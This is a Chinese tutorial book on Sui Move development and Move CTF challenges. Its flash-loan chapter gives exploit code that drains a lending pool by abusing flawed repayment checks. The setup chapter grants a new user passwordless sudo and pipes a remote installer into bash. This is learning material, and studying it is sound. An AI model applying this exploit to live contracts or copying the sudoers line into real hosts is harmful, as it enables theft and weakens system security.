
# index.html
# 《From 0 to Hero : Move CTF 指北》

[ ](print.html "Print this book")

# [《From 0 to Hero : Move CTF 指北》](#from-0-to-hero--move-ctf-指北)

什么要写这个教程?

Hello,我是一个Move新手，从web2转行到web3. 这里记录了我使用**费曼学习法**(以教为学，以输出代替输入)来学习Move和CTF的过程,欢迎小伙伴们一起交流:)

[TG群](https://t.me/movectf_cn)

立个Flag: 找个remote job,做一个web3数字游民，哈哈.

[ ](quick/index.html "Next chapter")

[ ](quick/index.html "Next chapter")

# index.html
# 《From 0 to Hero : Move CTF 指北》

[ ](../print.html "Print this book")

# [快速入门](#快速入门)

本章介绍如何快速搭建开发环境，编写第一个Sui App。 然后通过MoveCTF 2022两道题目，小试牛刀。

[ ](../index.html "Previous chapter") [ ](../quick/sui_env.html "Next chapter")

[ ](../index.html "Previous chapter") [ ](../quick/sui_env.html "Next chapter")

# sui_env.html
# 《From 0 to Hero : Move CTF 指北》

[ ](../print.html "Print this book")

本文记录在一个全新的VPS上，从0开始搭建Sui的开发环境。

## [搭建环境](#搭建环境)

ssh登录vps后，如果使用的是root账户,一定要新建一个普通权限账户(有些软件不允许使用root运行，比如马上用到的brew),并且将他添加到sudo组里.

```

    
    
    root@VM-0-7-debian:~# useradd -m test
    root@VM-0-7-debian:~# echo 'test ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
    root@VM-0-7-debian:~# su test
    $ bash
    test@VM-0-7-debian:/root$ ls
    ls: cannot open directory '.': Permission denied
    test@VM-0-7-debian:/root$ cd
    test@VM-0-7-debian:~$ ls
    
```

参考官方文档搭建环境 https://docs.sui.io/guides/developer/getting-started/sui-install

### [使用brew安装sui](#使用brew安装sui)

由于VPS的性能不够，所以不能使用源码安装sui，采用brew安装，先安装brew. 使用普通权限账户执行一下命令

```

    
    
    /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
    (echo; echo 'eval "$(/home/linuxbrew/.linuxbrew/bin/brew shellenv)"') >> /home/test/.profile
    eval "$(/home/linuxbrew/.linuxbrew/bin/brew shellenv)"
    
```

然后安装sui

```

    
    
    test@VM-0-7-debian:~$ brew install sui
    ==> Auto-updating Homebrew...
    Adjust how often this is run with HOMEBREW_AUTO_UPDATE_SECS or disable with
    HOMEBREW_NO_AUTO_UPDATE. Hide these hints with HOMEBREW_NO_ENV_HINTS (see `man brew`).
    ==> Downloading https://ghcr.io/v2/homebrew/core/sui/manifests/1.26.0
    ###################################################################################################################################################### 100.0%
    ==> Fetching sui
    ==> Downloading https://ghcr.io/v2/homebrew/core/sui/blobs/sha256:a68e100359a64e93b42de54a296e23c246e4cd15be3ecbc21e1c7ee942a2e126
    ###################################################################################################################################################### 100.0%
    ==> Pouring sui--1.26.0.x86_64_linux.bottle.tar.gz
    🍺 /home/linuxbrew/.linuxbrew/Cellar/sui/1.26.0: 9 files, 127.6MB
    ==> Running `brew cleanup sui`...
    Disable this behaviour by setting HOMEBREW_NO_INSTALL_CLEANUP.
    Hide these hints with HOMEBREW_NO_ENV_HINTS (see `man brew`).
    test@VM-0-7-debian:~$ sui -V
    sui 1.26.0-homebrew
    
```

### [client设置testnet](#client设置testnet)

第一次执行`sui client` 会生成配置文件`~/.sui/sui_config/client.yaml`

```

    
    
    test@VM-0-7-debian:~$ sui client
    Config file ["/home/test/.sui/sui_config/client.yaml"] doesn't exist, do you want to connect to a Sui Full node server [y/N]?y
    Sui Full node server URL (Defaults to Sui Testnet if not specified) : https://fullnode.testnet.sui.io:443
    Environment alias for [https://fullnode.testnet.sui.io:443] : testnet
    Select key scheme to generate keypair (0 for ed25519, 1 for secp256k1, 2: for secp256r1):
    0
    
```

初始化钱包后，会打印助记词，记录下来

### [获取测试币](#获取测试币)

获取钱包地址

```

    
    
    test@VM-0-7-debian:~$ sui client addresses
    ╭──────────────────────┬────────────────────────────────────────────────────────────────────┬────────────────╮
    │ alias        │ address                              │ active address │
    ├──────────────────────┼────────────────────────────────────────────────────────────────────┼────────────────┤
    │ youthful-hypersthene │ 0x041f524144f3b0607099f7370a3184f4093510ade5c123409ed76440c8a50537 │ *       │
    ╰──────────────────────┴────────────────────────────────────────────────────────────────────┴────────────────╯
    
```

使用curl在水龙头拿币

```

    
    
    curl --location --request POST 'https://faucet.testnet.sui.io/gas' \
    --header 'Content-Type: application/json' \
    --data-raw '{
      "FixedAmountRequest": {
        "recipient": "0x041f524144f3b0607099f7370a3184f4093510ade5c123409ed76440c8a50537"
      }
    }'
    
```

## [开始第一个应用](#开始第一个应用)

自此环境搭建完毕,建议新手再学习下vim的基本操作 https://docs.sui.io/guides/developer/first-app/write-package

后续需要切换到主网

```

    
    
    test@VM-0-7-debian:~$ sui client envs
    ╭─────────┬─────────────────────────────────────┬────────╮
    │ alias  │ url                 │ active │
    ├─────────┼─────────────────────────────────────┼────────┤
    │ testnet │ https://fullnode.testnet.sui.io:443 │ *   │
    ╰─────────┴─────────────────────────────────────┴────────╯
    test@VM-0-7-debian:~$ sui client new-env --alias=mainnet --rpc https://fullnode.mainnet.sui.io:443
    Added new Sui env [mainnet] to config.
    test@VM-0-7-debian:~$ sui client switch --env mainnet
    Active environment switched to [mainnet]
    test@VM-0-7-debian:~$ sui client envs
    ╭─────────┬─────────────────────────────────────┬────────╮
    │ alias  │ url                 │ active │
    ├─────────┼─────────────────────────────────────┼────────┤
    │ testnet │ https://fullnode.testnet.sui.io:443 │    │
    │ mainnet │ https://fullnode.mainnet.sui.io:443 │ *   │
    ╰─────────┴─────────────────────────────────────┴────────╯
    
```

[ ](../quick/index.html "Previous chapter") [ ](../quick/MoveCTF2022_1.html "Next chapter")

[ ](../quick/index.html "Previous chapter") [ ](../quick/MoveCTF2022_1.html "Next chapter")

# MoveCTF2022_1.html
# 《From 0 to Hero : Move CTF 指北》

[ ](../print.html "Print this book")

本文通过MoveCTF2022的签到题，介绍Sui基本的发布、测试方法。 Sui开发环境搭建请参考 [使用VPS从0搭建Sui开发环境](https://m4sk93.github.io/posts/vps_sui_env/) 原题目在https://github.com/movebit/movectf-1/blob/master/sources/module.move

## [搭建题目环境](#搭建题目环境)

在testnet搭建 由于Move2024版本的变化，调整了下源码

```

    
    
    test@VM-0-7-debian:~$ sui client switch --env testnet
    Active environment switched to [testnet]
    test@VM-0-7-debian:~$ sui move new movectf2022_checkin
    test@VM-0-7-debian:~$ cd movectf2022_checkin/
    test@VM-0-7-debian:~/movectf2022_checkin$ ls
    Move.toml sources tests
    test@VM-0-7-debian:~/movectf2022_checkin$ cd sources/
    test@VM-0-7-debian:~/movectf2022_checkin/sources$ ls
    movectf2022_checkin.move
    test@VM-0-7-debian:~/movectf2022_checkin/sources$ vim movectf2022_checkin.move
    test@VM-0-7-debian:~/movectf2022_checkin/sources$ cat movectf2022_checkin.move
    /// Module: movectf2022_checkin
    module movectf2022_checkin::movectf2022_checkin {
      use sui::event;
      use sui::tx_context::{Self, TxContext};
      ///Visibility annotations are required on struct declarations from the Move 2024 edition onwards.
      ///struct Flag has copy, drop {
      public struct Flag has copy, drop {
        user: address,
        flag: bool
      }
      public entry fun get_flag(ctx: &mut TxContext) {
        event::emit(Flag {
          user: tx_context::sender(ctx),
          flag: true
        })
      }
    }
    test@VM-0-7-debian:~/movectf2022_checkin$ sui move build
    ......
    test@VM-0-7-debian:~/movectf2022_checkin$ sui client publish
    ......
    │ Published Objects:                                        │
    │ ┌──                                               │
    │ │ PackageID: 0xa4dad4ee99aa00397e68a32173a36d4c0ad66fe79e4d448df2b5c9c09f90ab6b         │
    │ │ Version: 1                                          │
    │ │ Digest: CMCrLDaHtcLy8pvecy55xVvDVcAUz36hsqYBkEkpUThh                     │
    │ │ Modules: movectf2022_checkin                                 │
    │ └──
    
```

## [获取flag](#获取flag)

直接调用接口即可,通过event返回flag

```

    
    
    test@VM-0-7-debian:~/movectf2022_checkin$ vim call.sh
    test@VM-0-7-debian:~/movectf2022_checkin$ cat call.sh
    #!/bin/bash
    PackageID=0xa4dad4ee99aa00397e68a32173a36d4c0ad66fe79e4d448df2b5c9c09f90ab6b
    sui client call --package $PackageID \
            --module movectf2022_checkin \
            --function get_flag
    test@VM-0-7-debian:~/movectf2022_checkin$ chmod +x call.sh
    test@VM-0-7-debian:~/movectf2022_checkin$ ./call.sh
    ...
    ╭─────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
    │ Transaction Block Events                                          │
    ├─────────────────────────────────────────────────────────────────────────────────────────────────────────────┤
    │ ┌──                                                    │
    │ │ EventID: 3ntybkcdkNLriDtfYyiJ9yhCMdMEUzTbdgyLQzt2ww7p:0                         │
    │ │ PackageID: 0xa4dad4ee99aa00397e68a32173a36d4c0ad66fe79e4d448df2b5c9c09f90ab6b              │
    │ │ Transaction Module: movectf2022_checkin                                 │
    │ │ Sender: 0x041f524144f3b0607099f7370a3184f4093510ade5c123409ed76440c8a50537                │
    │ │ EventType: 0xa4dad4ee99aa00397e68a32173a36d4c0ad66fe79e4d448df2b5c9c09f90ab6b::movectf2022_checkin::Flag │
    │ │ ParsedJSON:                                               │
    │ │  ┌──────┬────────────────────────────────────────────────────────────────────┐             │
    │ │  │ flag │ true                                │             │
    │ │  ├──────┼────────────────────────────────────────────────────────────────────┤             │
    │ │  │ user │ 0x041f524144f3b0607099f7370a3184f4093510ade5c123409ed76440c8a50537 │             │
    │ │  └──────┴────────────────────────────────────────────────────────────────────┘             │
    │ └──                                                    │
    ╰─────────────────────────────────────────────────────────────────────────────────────────────────────────────╯
    ...
    
```

[ ](../quick/sui_env.html "Previous chapter") [ ](../quick/MoveCTF2022_3.html "Next chapter")

[ ](../quick/sui_env.html "Previous chapter") [ ](../quick/MoveCTF2022_3.html "Next chapter")

# MoveCTF2022_3.html
# 《From 0 to Hero : Move CTF 指北》

[ ](../print.html "Print this book")

原题目在https://github.com/movebit/movectf-4/blob/master/sources/module.move 考察闪电贷 由于Move2024有些变化，我对源码做了微调https://github.com/m4sk93/movectf/tree/main/movectf2022/flashloan

## [环境搭建](#环境搭建)

参考[MoveCTF2022 Checkin](https://m4sk93.github.io/posts/movectf2022_1/)部署题目后， 为了后续调用方便，在配置文件中添加package ID

```

    
    
    [package]
    name = "movectf2022_flashloan"
    edition = "2024.beta" # edition = "legacy" to use legacy (pre-2024) Move
    # license = ""      # e.g., "MIT", "GPL", "Apache 2.0"
    # authors = ["..."]   # e.g., ["Joe Smith (joesmith@noemail.com)", "John Snow (johnsnow@noemail.com)"]
    published-at = "0x2a61d471519b8e85a7730bebcfc3c5cace6ffffb2f5576d593821422d514adc2" # package id
    [dependencies]
    Sui = { git = "https://github.com/MystenLabs/sui.git", subdir = "crates/sui-framework/packages/sui-framework", rev = "framework/testnet" }
    [addresses]
    #movectf2022_flashloan = "0x0"
    movectf2022_flashloan = "0x2a61d471519b8e85a7730bebcfc3c5cace6ffffb2f5576d593821422d514adc2" # package id
    
```

## [编写exp](#编写exp)

为了调用题目，在配置文件中添加依赖

```

    
    
    [dependencies]
    Sui = { git = "https://github.com/MystenLabs/sui.git", subdir = "crates/sui-framework/packages/sui-framework", rev = "framework/testnet" }
    movectf2022_flashloan= { local = "../movectf2022_flashloan/" }
    
```

初步分析getflag时会检查是否已经把池子抽干,

```

    
    
      // check whether you can get the flag
      public entry fun get_flag(self: &mut FlashLender, ctx: &mut TxContext) {
        if (balance::value(&self.to_lend) == 0) {
          event::emit(Flag { user: tx_context::sender(ctx), flag: true });
        }
      }
    
```

直接试试：

```

    
    
    /// Module: exp
    module exp::exp {
      use sui::tx_context::TxContext;
      use movectf2022_flashloan::flash::{Self, FlashLender};
      public entry fun exp1(lender: &mut FlashLender, ctx: &mut TxContext) {
        let (coin, receipt) = flash::loan(lender, 1000, ctx);
        flash::get_flag(lender, ctx);
      }
    }
    
```

结果编译时就报错

```

    
    
    error[E06001]: unused value without 'drop'
      ┌─ ./sources/exp.move:9:37
      │
     8 │     let (coin, receipt) = flash::loan(lender, 1000, ctx);
      │       ---- The local variable 'coin' still contains a value. The value does not have the 'drop' ability and must be consumed before the function returns
     9 │     flash::get_flag(lender, ctx);
      │                   ^ Invalid return
      │
      ┌─ ./../movectf2022_flashloan/sources/movectf2022_flashloan.move:54:9
      │
    54 │   ): (Coin<FLASH>, Receipt) {
      │     ----------- The type 'sui::coin::Coin<movectf2022_flashloan::flash::FLASH>' does not have the ability 'drop'
      │
      ┌─ /home/kali/.move/https___github_com_MystenLabs_sui_git_framework__testnet/crates/sui-framework/packages/sui-framework/sources/coin.move:35:19
      │
    35 │   public struct Coin<phantom T> has key, store {
      │          ---- To satisfy the constraint, the 'drop' ability would need to be added here
    error[E06001]: unused value without 'drop'
      ┌─ ./sources/exp.move:9:37
      │
     8 │     let (coin, receipt) = flash::loan(lender, 1000, ctx);
      │          ------- The local variable 'receipt' still contains a value. The value does not have the 'drop' ability and must be consumed before the function returns
     9 │     flash::get_flag(lender, ctx);
      │                   ^ Invalid return
      │
      ┌─ ./../movectf2022_flashloan/sources/movectf2022_flashloan.move:24:19
      │
    24 │   public struct Receipt {
      │          ------- To satisfy the constraint, the 'drop' ability would need to be added here
      ·
    54 │   ): (Coin<FLASH>, Receipt) {
      │           ------- The type 'movectf2022_flashloan::flash::Receipt' does not have the ability 'drop'
    
```

所以必须对coin和receipt进行处理,不能让你贷完就跑路

注意看代码里的这个结构体：

```

    
    
      public struct Receipt {
        flash_lender_id: ID,
        amount: u64
      }
    
```

参考 [Hot Potato](https://examples.sui.io/patterns/hot-potato.html) (Hot Potato is a name for a struct that has no abilities, hence it can only be packed and unpacked in its module. In this struct, you must call function B after function A in the case where function A returns a potato and function B consumes it.)

```

    
    
    /// Module: exp
    module exp::exp {
      use sui::tx_context::TxContext;
      use movectf2022_flashloan::flash::{Self, FlashLender};
      public entry fun exp1(lender: &mut FlashLender, ctx: &mut TxContext) {
        let (coin, receipt) = flash::loan(lender, 1000, ctx);
        flash::get_flag(lender, ctx);
        flash::repay(lender, coin);
        flash::check(lender, receipt);
      }
    }
    
```

有借有还，这下成功了.

问题来了，可以不还吗？？？

还有一种利用方式

```

    
    
    /// Module: exp
    module exp::exp {
      use sui::tx_context::TxContext;
      use movectf2022_flashloan::flash::{Self, FlashLender};
      public entry fun exp1(lender: &mut FlashLender, ctx: &mut TxContext) {
        let (coin, receipt) = flash::loan(lender, 1000, ctx);
        flash::get_flag(lender, ctx);
        flash::repay(lender, coin);
        flash::check(lender, receipt);
      }
      public entry fun exp2(lender: &mut FlashLender, ctx: &mut TxContext) {
        let (coin, receipt) = flash::loan(lender, 1000, ctx);
        flash::deposit(lender, coin, ctx);
        flash::check(lender, receipt);
        flash::withdraw(lender, 1000, ctx);
        flash::get_flag(lender, ctx);
      }
    }
    
```

问题在于：coin可以通过`deposit`消耗掉.通过`check`消耗`receipt`时不需要发送coin.而且check判断余额的方式也不对。

## [拓展](#拓展)

https://github.com/movebit/movectf2024-day1/tree/main/swap

## [参考资料](#参考资料)

感谢大佬们无私分享

  * [MoveCTF 2022 题解](https://lanford33.com/movectf-2022)
  * [MoveCTF 所有题解Writeup](https://learnblockchain.cn/index.php/article/5025)

[ ](../quick/MoveCTF2022_1.html "Previous chapter") [ ](../letsmove/index.html "Next chapter")

[ ](../quick/MoveCTF2022_1.html "Previous chapter") [ ](../letsmove/index.html "Next chapter")

# index.html
# 《From 0 to Hero : Move CTF 指北》

[ ](../print.html "Print this book")

# [letsmove](#letsmove)

Move 分家了，这里主要讲的是Sui move

关于Aptos的学习资料推荐 https://learn.aptoslabs.com/tutorials

[ ](../quick/MoveCTF2022_3.html "Previous chapter") [ ](../letsmove/task_1.html "Next chapter")

[ ](../quick/MoveCTF2022_3.html "Previous chapter") [ ](../letsmove/task_1.html "Next chapter")

# task_1.html
# 《From 0 to Hero : Move CTF 指北》

[ ](../print.html "Print this book")

# [task1](#task1)

https://docs.sui.io/guides/developer/getting-started/connect#configure-sui-client https://docs.sui.io/guides/developer/first-app/write-package

https://medium.com/@andreidev/publish-a-hello-world-smart-contract-on-sui-network-414bb1bac245 https://suiscan.xyz/testnet/object/0x3737f9b6b90b74f087b1db32ec2beaceb7688e55b9dba8bb6889038bb208e2d5/contracts

[ ](../letsmove/index.html "Previous chapter") [ ](../letsmove/task_2.html "Next chapter")

[ ](../letsmove/index.html "Previous chapter") [ ](../letsmove/task_2.html "Next chapter")

# task_2.html
# 《From 0 to Hero : Move CTF 指北》

[ ](../print.html "Print this book")

# [task2](#task2)

### [coin](#coin)

  * 10_coin协议_move编程语言2024版本 https://www.bilibili.com/video/BV1tf42127Co/?spm_id_from=333.788 https://www.bilibili.com/video/BV1Kw4m197ae/?spm_id_from=333.788.recommend_more_video.13

  * https://docs.sui.io/guides/developer/sui-101/create-coin 示例有错


```

    
    
    struct MYCOIN has drop {}
    
```

应该添加public

  * https://sui-book.com/framework/02.coin.html

```

    
    
    │ ┌──                                                                 │
    │ │ ObjectID: 0xc826cb5f07f8e4b65e9e6170d9be14f6c2bd1b2f65d7835a9f31562786ea77a4                            │
    │ │ Sender: 0xfd72aa1c93c65b9487ca060a32bff2851624117d35078f54618384b1e0d16849                             │
    │ │ Owner: Account Address ( 0xfd72aa1c93c65b9487ca060a32bff2851624117d35078f54618384b1e0d16849 )                   │
    │ │ ObjectType: 0x2::coin::TreasuryCap<0x2a056973b19d7ac2a202acdb7ec1d952a51dde475a9ee579ba6b2d594bf1dea6::m4sk93_coin::M4SK93_COIN>  │
    │ │ Version: 1248931                                                          │
    │ │ Digest: 3ywK1W96939rB6A3Ar6Htd8wCQ17erKFVXnDs6SomuZK
    ...
    PackageID: 0x2a056973b19d7ac2a202acdb7ec1d952a51dde475a9ee579ba6b2d594bf1dea6
    
```

```

    
    
    sui client call --function mint --module mycoin --package <PACKAGE-ID> --args <TREASURY-CAP-ID> <COIN-AMOUNT> <RECIPIENT-ADDRESS> --gas-budget <GAS-AMOUNT>
    sui client call --function mint --module m4sk93_coin --package 0x2a056973b19d7ac2a202acdb7ec1d952a51dde475a9ee579ba6b2d594bf1dea6 --args 0xc826cb5f07f8e4b65e9e6170d9be14f6c2bd1b2f65d7835a9f31562786ea77a4 100 0xe13769b8c84f7c4011d001c1d9e5c471e8d5fb612cb44b76fcfbf0eebaa08ced --gas-budget 50000000
    
```

https://suiscan.xyz/testnet/tx/5cReZ9J9pXPJK9FoTPJA4TFk1ZLERs1dHqXqJbn9Esj8

### [faucet](#faucet)

  * public_transfer 独享 mint权限
  * public_share_object 共享 mint权限



两个改动

```

    
    
      ...
        ///transfer::public_transfer(treasury, tx_context::sender(ctx));
        ///The Coin<T> is a generic implementation of a coin on Sui.
        ///Access to the TreasuryCap provides control over the minting and burning of coins.
        ///Further transactions can be sent directly to the sui::coin::Coin with TreasuryCap object as authorization.
    
        transfer::public_share_object(treasury)
      }
      ///public fun mint(
      public entry fun mint(
      ...
    
```

```

    
    
    PackageID: 0x8194063d47171bcbdd6e7ddce605aa8a6bd8b482315ca236a909695d9e5a9fe2
    TreasuryCap: 0x00f68f1b2d0c87e6d1aa55f2dc82e16683e18eee72d7e1f871349f2a18776aac
    sui client call --function mint --module m4sk93_faucet_coin --package 0x8194063d47171bcbdd6e7ddce605aa8a6bd8b482315ca236a909695d9e5a9fe2 --args 0x00f68f1b2d0c87e6d1aa55f2dc82e16683e18eee72d7e1f871349f2a18776aac 200 0xe13769b8c84f7c4011d001c1d9e5c471e8d5fb612cb44b76fcfbf0eebaa08ced --gas-budget 50000000
    
```

也可以在网页版mint https://suiscan.xyz/testnet/object/0x8194063d47171bcbdd6e7ddce605aa8a6bd8b482315ca236a909695d9e5a9fe2/txs

### [coin(主网测试)](#coin主网测试)

** sui client publish ** 报错

```

    
    
    Failed to publish the Move module(s), reason: [warning] Multiple source verification errors found:
    - Local dependency did not match its on-chain version at 0000000000000000000000000000000000000000000000000000000000000002::Sui::deny_list
    - Local dependency did not match its on-chain version at 0000000000000000000000000000000000000000000000000000000000000001::MoveStdlib::type_name
    - Local dependency did not match its on-chain version at 0000000000000000000000000000000000000000000000000000000000000002::Sui::object
    This may indicate that the on-chain version(s) of your package's dependencies may behave differently than the source version(s) your package was built against.
    Fix this by rebuilding your packages with source versions matching on-chain versions of dependencies, or ignore this warning by re-running with the --skip-dependency-verification flag.
    
```

解决办法:把Move.toml中依赖修改为** framework/mainnet ** 还不行就

```

    
    
    sui client publish --skip-dependency-verification
    
```

```

    
    
    TreasuryCap:
    0x5eeffd6ca1fb38d63701ea8e1a3c1f3bff348441aec0a1eeae45f023eb62d120
    PackageID: 
    0x38974bd3a9dad0e8274024b49642e2f0fa94fc4889219791e3742c8730528fd0
    sui client call --function mint --module m4sk93_coin --package 0x38974bd3a9dad0e8274024b49642e2f0fa94fc4889219791e3742c8730528fd0 --args 0x5eeffd6ca1fb38d63701ea8e1a3c1f3bff348441aec0a1eeae45f023eb62d120 100 0xe13769b8c84f7c4011d001c1d9e5c471e8d5fb612cb44b76fcfbf0eebaa08ced --gas-budget 50000000
    
```

### [faucet coin (主网测试)](#faucet-coin-主网测试)

```

    
    
    TreasuryCap:
    0xaa6391b1bd2e95cd3d10418c540c79c4aac371677aa9e4c6f54c6551a48cc38e
    PackageID: 
    0xe799e4d1324db8877c827cb4ca78dc065a8f9ef70fbe705e4c8c37250e195982
    sui client call --function mint --module m4sk93_faucet_coin --package 0xe799e4d1324db8877c827cb4ca78dc065a8f9ef70fbe705e4c8c37250e195982 --args 0xaa6391b1bd2e95cd3d10418c540c79c4aac371677aa9e4c6f54c6551a48cc38e 200 0xe13769b8c84f7c4011d001c1d9e5c471e8d5fb612cb44b76fcfbf0eebaa08ced --gas-budget 50000000
    
```

网页再mint一下 https://suiscan.xyz/mainnet/object/0xe799e4d1324db8877c827cb4ca78dc065a8f9ef70fbe705e4c8c37250e195982/contracts https://suiscan.xyz/mainnet/object/0xe799e4d1324db8877c827cb4ca78dc065a8f9ef70fbe705e4c8c37250e195982/txs

[ ](../letsmove/task_1.html "Previous chapter") [ ](../letsmove/task_3.html "Next chapter")

[ ](../letsmove/task_1.html "Previous chapter") [ ](../letsmove/task_3.html "Next chapter")

# task_3.html
# 《From 0 to Hero : Move CTF 指北》

[ ](../print.html "Print this book")

# [task3](#task3)

https://medium.com/building-on-sui/code-in-move-6-minting-nfts-on-sui-with-kiosk-5d9ba1636a7b

mint 一个 nft 发送到地址: 0x7b8e0864967427679b4e129f79dc332a885c6087ec9e187b53451a9006ee15f2 https://suiscan.xyz/mainnet/object/0xf01b9c73ad3b205ff2d4666266168173df0bd4d1c0661b80d59803c2ba64fe70/contracts

```

    
    
    sui client call --function mint_and_transfer --module m4sk93_nft --package 0xf01b9c73ad3b205ff2d4666266168173df0bd4d1c0661b80d59803c2ba64fe70 --args first_m4sk93_nft 0x7b8e0864967427679b4e129f79dc332a885c6087ec9e187b53451a9006ee15f2 --gas-budget 50000000
    
```

https://suiscan.xyz/mainnet/tx/5QnRk6wUasMNYzXpVjHyMiBmtyhCJ4wEfMrUWLyrfio8

[ ](../letsmove/task_2.html "Previous chapter") [ ](../letsmove/task_4.html "Next chapter")

[ ](../letsmove/task_2.html "Previous chapter") [ ](../letsmove/task_4.html "Next chapter")

# task_4.html
# 《From 0 to Hero : Move CTF 指北》

[ ](../print.html "Print this book")

# [task4](#task4)

### [如何使用task2的合约](#如何使用task2的合约)

```

    
    
    [dependencies]
    Sui = { git = "https://github.com/MystenLabs/sui.git", subdir = "crates/sui-framework/packages/sui-framework", rev = "framework/mainnet" }
    m4sk93_faucet_coin= { local = "../../task2/m4sk93_faucet_coin" }
    
```

同时修改m4sk93_faucet_coin的Move.toml

```

    
    
    [package]
    published-at = "0xe799e4d1324db8877c827cb4ca78dc065a8f9ef70fbe705e4c8c37250e195982" # package id
    [addresses]
    m4sk93_faucet_coin = "0xe799e4d1324db8877c827cb4ca78dc065a8f9ef70fbe705e4c8c37250e195982" # package id
    
```

[ ](../letsmove/task_3.html "Previous chapter") [ ](../letsmove/task_5.html "Next chapter")

[ ](../letsmove/task_3.html "Previous chapter") [ ](../letsmove/task_5.html "Next chapter")

# task_5.html
# 《From 0 to Hero : Move CTF 指北》

[ ](../print.html "Print this book")

# [task5](#task5)

https://github.com/MystenLabs/sui/blob/main/sui_programmability/examples/defi/sources/pool.move

https://github.com/sui-foundation/sui-move-intro-course/blob/main/unit-three/lessons/3_witness_design_pattern.md#the-phantom-keyword

[ ](../letsmove/task_4.html "Previous chapter") [ ](../letsmove/task_6.html "Next chapter")

[ ](../letsmove/task_4.html "Previous chapter") [ ](../letsmove/task_6.html "Next chapter")

# task_6.html
# 《From 0 to Hero : Move CTF 指北》

[ ](../print.html "Print this book")

# [task6](#task6)

### [dapp-kit helloword](#dapp-kit-helloword)

  * https://sdk.mystenlabs.com/dapp-kit
  * [Let's move - Sui Dapp Kit Hello Sui交互](https://www.learnblockchain.cn/article/7514)

```

    
    
    $ npm create @mysten/dapp
    ▸ react-client-dapp React Client dApp that reads data from wallet and the blockchain
     react-e2e-counter React dApp with a move smart contract that implements a distributed counter
    $ cd my-first-sui-dapp && tree
    .
    ├── index.html
    ├── package.json
    ├── prettier.config.cjs
    ├── README.md
    ├── src
    │   ├── App.tsx
    │   ├── main.tsx
    │   ├── OwnedObjects.tsx
    │   ├── vite-env.d.ts
    │   └── WalletStatus.tsx
    ├── tsconfig.json
    ├── tsconfig.node.json
    └── vite.config.ts
    2 directories, 12 files
    
```

之前已经在chrome安装了钱包,直接执行查看一下效果

```

    
    
    $ npm install
    $ npm run dev
     VITE v4.5.3 ready in 186 ms
     ➜ Local:  http://localhost:5173/
     ➜ Network: use --host to expose
     ➜ press h to show help
    
```

连接钱包后显示

```

    
    
    Wallet Status
    Wallet connected
    Address: 0xe13......
    Objects owned by the connected wallet
    Object ID: 0x287......
    Object ID: 0xce0......
    
```

关于.tsx：在TypeScript语言中支持JSX语法.TypeScript编译器可以将JSX语法转换为React.createElement函数调用的形式，从而在运行时创建React组件。

### [PDT](#pdt)

Programmable Transaction Blocks https://docs.sui.io/concepts/transactions/prog-txn-blocks PTBs allow a user to call multiple Move functions, manage their objects, and manage their coins in a single transaction--without publishing a new Move package.

```

    
    
    npm i @mysten/sui.js
    npm i navi-sdk
    
```

https://naviprotocol.gitbook.io/navi-protocol-developer-docs/how-to-interact-with-the-contract/navi-sdk#navi-flash-loan-sample https://sdk.mystenlabs.com/dapp-kit/wallet-hooks/useSignAndExecuteTransactionBlock

Navi不能在devnet/testnet中使用？? 修改main.tsx 中的defaultNetwork

```

    
    
        <SuiClientProvider networks={networkConfig} defaultNetwork="mainnet">
    
```

https://suiscan.xyz/mainnet/tx/7Mt6Cu9xSEWRxCdPsczZEbi6NBCYYa2JnBN21pz3Nifh

Todo:

  * withdrawCoin测试失败

[ ](../letsmove/task_5.html "Previous chapter") [ ](../letsmove/task_7.html "Next chapter")

[ ](../letsmove/task_5.html "Previous chapter") [ ](../letsmove/task_7.html "Next chapter")

# task_7.html
# 《From 0 to Hero : Move CTF 指北》

[ ](../print.html "Print this book")

# [task7](#task7)

完成 Move CTF Check in

  * 上链网络: 测试网(testnet)



## [需求](#需求)

  * 完成 CLI 调用学习
  * 理解合约交互传值
  * 完成 Move CTF Check In
  * 必须用Sui CLI 调用完成



## [任务指南](#任务指南)

  * 合约部署地址: `0x60695ee31f93add1f79909c884a55dff7e5f140bbd2e495819966bd2f7971d42`
  * FlagStr Object:`0x011f9404e6f167e549b617a53eea058029167a2beac26c624cbc3550e04b5ad2`
  * random: `0x8`
  * github id: 填写自己的github id



### [题目源码](#题目源码)

[Move CTF Check In](https://github.com/move-cn/letsmove-ctf/tree/main/src/01_check_in/check_in)

# [分析](#分析)

关于random https://docs.sui.io/guides/developer/advanced/randomness-onchain

```

    
    
    Random has a reserved address 0x8. See random.move for the Move APIs for accessing randomness on Sui.
    
```

每次提交flag后string会变化，所以先在链上看看string的值是`N21X` https://suiscan.xyz/testnet/object/0x011f9404e6f167e549b617a53eea058029167a2beac26c624cbc3550e04b5ad2

```

    
    
    #!/bin/bash
    PackageID=0x60695ee31f93add1f79909c884a55dff7e5f140bbd2e495819966bd2f7971d42
    FlagStr_Object=0x011f9404e6f167e549b617a53eea058029167a2beac26c624cbc3550e04b5ad2
    github_id="m4sk93"
    string="N21X"
    rand="0x8"
    sui client call --package $PackageID \
            --module check_in \
            --function get_flag \
            --args $string $github_id $FlagStr_Object $rand
    
```

Transaction Digest: BNKqqwLPDiA1th71C1qp8nAMzdYFC8WhkXaBjoNyZhWD

[ ](../letsmove/task_6.html "Previous chapter") [ ](../letsmove/task_8.html "Next chapter")

[ ](../letsmove/task_6.html "Previous chapter") [ ](../letsmove/task_8.html "Next chapter")

# task_8.html
# 《From 0 to Hero : Move CTF 指北》

[ ](../print.html "Print this book")

# [task8](#task8)

为了不影响比赛，解题过程等一段时间再放上来

```

    
    
    #!/bin/bash
    PackageID=0x097a3833b6b5c62ca6ad10f0509dffdadff7ce31e1d86e63e884a14860cedc0f
    Challenge_Object=0x19e76ca504c5a5fa5e214a45fca6c058171ba333f6da897b82731094504d5ab9
    github_id="m4sk93"
    # 0xe7c6000000000000
    proof="[0xe7,0xc6,0,0,0,0,0,0]"
    rand="0x8"
    sui client call --package $PackageID \
            --module lets_move \
            --function get_flag \
            --args $proof $github_id $Challenge_Object $rand
    
```

Transaction Digest: 7uCNDToLAkLm7Ks1bUJirqNRjNrZ2vCbwyYEvFUHGuB9

[ ](../letsmove/task_7.html "Previous chapter") [ ](../MoveCTF2024/index.html "Next chapter")

[ ](../letsmove/task_7.html "Previous chapter") [ ](../MoveCTF2024/index.html "Next chapter")

# index.html
# 《From 0 to Hero : Move CTF 指北》

[ ](../print.html "Print this book")

# [MoveCTF 2024](#movectf-2024)

